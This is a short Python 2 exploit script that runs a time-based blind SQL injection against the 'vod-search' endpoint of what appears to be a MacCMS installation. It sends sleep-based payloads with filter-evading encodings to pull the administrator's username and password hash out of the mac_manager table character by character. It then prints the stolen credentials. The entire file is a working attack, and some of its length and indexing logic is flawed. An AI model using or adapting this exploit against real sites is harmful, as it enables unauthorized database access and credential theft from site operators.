#! /usr/bin/python
# -*- coding:utf-8 -*-
import requests
import time
dict = "1234567890qwertyuiopasdfghjklzxcvbnm_{}QWERTYUIOPASDFGHJKLZXCVBNM,@.?"
UserName=''
UserPass=''
UserName_length=0
url='http://sb.com/'
url = url + r'/index.php?m=vod-search'
def main():
    global UserName
    global url
    for i in range(30):
        startTime = time.time()
        sql = "))||if((select%0bascii(length((select(m_name)``from(mac_manager))))={}),(`sleep`(3)),0)#%25%35%63".format(
            ord(str(i)))
        data = {'wd': sql}
        response = requests.post(url, data=data)  # 发送请求
        if time.time() - startTime > 3:
            UserName_length = i
            print UserName_length
            break
    for num in range(1, UserName_length + 1):
        for i in dict:  # 遍历取出字符
            startTime = time.time()
            sql = "))||if((select%0bascii(substr((select(m_name)``from(mac_manager)),{},1))={}),(`sleep`(3)),0)#%25%35%63".format(
                str(num), ord(i))
            data = {'wd': sql}
            response = requests.post(url, data=data)  # 发送请求
            print data
            if time.time() - startTime > 3:
                UserName += i
                break
    global UserPass
    for num in range(32):
        for i in dict:  # 遍历取出字符
            startTime = time.time()
            sql = "))||if((select%0bascii(substr((select(m_password)``from(mac_manager)),{},1))={}),(`sleep`(3)),0)#%25%35%63".format(
                str(num), ord(i))
            data = {'wd': sql}
            response = requests.post(url, data=data)  # 发送请求
            print data
            if time.time() - startTime > 3:
                UserPass += i
                break
    print 'username:'+UserName,'password:'+UserPass
if __name__ == '__main__':
    main()
